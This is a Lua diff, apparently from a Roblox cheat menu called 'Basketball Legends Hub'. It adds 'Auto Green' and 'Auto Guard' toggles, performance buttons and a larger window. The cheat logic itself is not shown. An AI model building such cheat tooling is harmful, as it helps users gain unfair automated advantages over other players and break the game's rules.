-        ExecuteButton.Text = "⏳ Executing..."
-        wait(0.5)
-        runScripts()
-        ExecuteButton.Text = "✅ Scripts Executed!"
-        wait(2)
-        ExecuteButton.Text = "⚡ Execute Scripts"
+    -- Auto Green Toggle
+    AutoGreenToggle.MouseButton1Click:Connect(function()
+        AutoGreenEnabled = not AutoGreenEnabled
+        
+        if AutoGreenEnabled then
+            AutoGreenToggle.Text = "🎯 Auto Green: ON"
+            AutoGreenToggle.BackgroundColor3 = Color3.fromRGB(50, 255, 50)
+            AutoGreenIndicator.Visible = true
+            setupAutoGreen()
+            sendNotification("✅ Auto Green", "Auto Green enabled! Hold E to shoot.", 3)
+        else
+            AutoGreenToggle.Text = "🎯 Auto Green: OFF"
+            AutoGreenToggle.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+            AutoGreenIndicator.Visible = false
+            sendNotification("❌ Auto Green", "Auto Green disabled.", 3)
+        end
+    end)
+
+    -- Auto Guard Toggle
+    AutoGuardToggle.MouseButton1Click:Connect(function()
+        AutoGuardEnabled = not AutoGuardEnabled
+        
+        if AutoGuardEnabled then
+            AutoGuardToggle.Text = "🛡️ Auto Guard: ON"
+            AutoGuardToggle.BackgroundColor3 = Color3.fromRGB(50, 150, 255)
+            setupAutoGuard()
+        else
+            AutoGuardToggle.Text = "🛡️ Auto Guard: OFF"
+            AutoGuardToggle.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+            sendNotification("❌ Auto Guard", "Auto Guard disabled.", 3)
+        end
+    end)
+
+    FPSBoostButton.MouseButton1Click:Connect(function()
+        boostFPS()
+    end)
+
+    LagReducerButton.MouseButton1Click:Connect(function()
+        reduceLag()
+    end)
+
+    RemoveTexturesButton.MouseButton1Click:Connect(function()
+        removeTextures()
+    end)
+
+    NetworkButton.MouseButton1Click:Connect(function()
+        optimizeNetwork()
     end)
 
     DiscordButton.MouseButton1Click:Connect(function()
@@ -428,10 +961,10 @@ LoadButton.MouseButton1Click:Connect(function()
     MainFrame.Size = UDim2.new(0, 0, 0, 0)
     MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
     TS:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
-        Size = UDim2.new(0, 400, 0, 350),
-        Position = UDim2.new(0.5, -200, 0.5, -175)
+        Size = UDim2.new(0, 450, 0, 400),
+        Position = UDim2.new(0.5, -225, 0.5, -200)
     }):Play()
 
     wait(0.5)
-    sendNotification("🏀 Welcome!", "Basketball Legends Hub Loaded", 5)
+    sendNotification("🏀 Welcome!", "Basketball Legends Hub Loaded - Toggle features in Home tab!", 5)
 end)
